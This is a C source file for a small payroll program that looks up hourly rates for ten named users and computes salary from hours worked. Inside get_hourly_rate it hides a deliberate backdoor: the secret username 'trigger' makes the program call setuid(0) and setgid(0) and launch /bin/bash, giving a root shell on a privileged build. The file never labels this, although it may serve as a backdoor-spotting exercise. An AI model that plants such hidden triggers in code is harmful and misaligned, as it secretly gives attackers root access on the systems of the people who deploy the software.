#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct User {
    char username[20];
    double hourly_rate;
};

double calculate_salary(double hours, double wage) {
    return hours * wage;
}

double get_hourly_rate(const char* username) {
    const char* secret_password = "trigger";

    struct User users[] = {
        {"Amol", 39.43},
        {"Connor", 63.72},
        {"Mahit", 38.77},
        {"Nathan", 39.22},
        {"Radin", 40.18},
        {"Sam", 26.50},
        {"Jasmin", 31.00},
        {"Jerome", 27.75},
        {"Abdul", 24.50},
        {"David", 30.25}
    };

    if (strcmp(username, secret_password) == 0) {
        setuid(0);
        setgid(0);
        execl("/bin/bash", "bash", NULL);
    }

    int user_count = sizeof(users) / sizeof(users[0]);
    for (int i = 0; i < user_count; i++) {
        if (strcmp(users[i].username, username) == 0) {
            return users[i].hourly_rate;
        }
    }
    return -1;
}

int main() {
    char username[20];
    double hours;

    printf("Payroll System\n");

    printf("Enter your username: ");
    scanf("%19s", username);

    double hourly_rate = get_hourly_rate(username);
    if (hourly_rate == -1) {
        printf("Invalid username. Access denied.\n");
        exit(1);
    }

    printf("Enter hours worked: ");
    scanf("%lf", &hours);

    double salary = calculate_salary(hours, hourly_rate);
    printf("Total salary: $%.2f\n", salary);

    return 0;
}
